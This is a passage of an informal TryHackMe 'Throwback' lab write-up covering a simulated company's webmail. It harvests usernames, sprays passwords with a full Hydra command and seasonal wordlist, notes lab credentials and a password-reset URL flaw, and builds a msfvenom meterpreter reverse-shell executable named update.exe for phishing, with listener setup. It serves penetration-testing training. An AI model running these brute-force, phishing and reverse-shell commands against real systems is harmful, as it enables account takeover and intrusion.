I then looks around the web app and I a **Personal Address Book** which contain Nicknames, Name, and Email. I guess this people are Throwback employee. Let's dump it here, this can be helpful for the future attack (brutforcing)

- source code
```js
if (document.domain != top.document.domain) { throw "Clickjacking security violation! Please log out immediately!"; /* this code should never execute - exception should already have been thrown since it's a security violation in this case to even try to access top.document.domain (but it's left here just to be extra safe
```
I check by using devtool `console.log(document.domain)` and `console.log(top.document.domain)` and it gives `10.200.11.232`. you can read more about `document.domain` [here](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain) 

# password spraying
We already have usernames from **Personal Address Book**. This is the email we got from *noreply*
```
From: 	"noreply" <noreply@throwback.local>
Date: 	Sun, August 9, 2020 5:32 pm
To: 	tbhguest@throwback.local
```
Base on the email we got from *noreply*, we can assume that the user name is the nickname in **Personal Address Book**. so let create a user list with nicknames in it.
```

SummersW
FoxxR

```
before we perform password spraying attack, We should try to login with HumphreyW (`HumphreyW:securitycenter`) credential which we got from `FW01`. and BOOM it works!!!!. Now we can exclude him from our attack.

So now let use Hydra to perfrom the attack. this is the syntax for running hydra.
```
hydra -t 64 -L users.txt -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/url/to/login.php:<user_parameter>=^USER^&<pass_parameter>=^PASS^:<error message>" -v
```
we could try with rockyou.txt directly but I will try with 2 passwords that we already know, `securitycenter` and `WelcomeTBH1!`.

To get `user_parameter` and `pass_parameter`, we can either use *burp suite* to intercept our resquest or check the *source code*. Now let craft our hydra command.
```
hydra -L nickname.txt -p <password> 10.200.11.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v -t 64
```

I tried with `securitycenter` and `WelcomeTBH1!`. It did't works... I was thinking to go for rockyou.txt but I gut said that I should check THM and They might mention something about a costumized wordlist, and yes they did. So I created wordlist
```console
bibo318@parrot:~/THM/throwback$ cat pass.txt 
Spring2020
Summer2020
Fall2020
Winter2020
Password123
TBHsec2020
Password2020
Management2020
```
now let run the attack
```console
bibo318@parrot:~/THM/throwback$ hydra -L nickname.txt -P pass.txt 10.200.11.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v -t 64

let's try to login to each account and look at their inbox. only `MurphyF` is actived.

Dear Frank Murphy,

Due to the recent firing of the Timekeep developer who had access to our
database, we have decided to issue a password reset. You can do so by
replacing your user account name and your new password in the following
URL:

http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD

Thank you,
IT Security.
```
seem like we can reset userser password by just viste that links. Unfortunally we do not have access to **TIME** yet. but let keep it in our [important notes](README.md)

# phishing
Let start by creating own reverse shell payload using `msfvenom` using staged Windows payload
```console
bibo318@parrot:~/THM/throwback$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o update.exe
```
now set a msfconsole to listen for incomming shell
```
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set lport 443
lport => 443
msf5 exploit(multi/handler) > exploit -j
```
here is our email content.
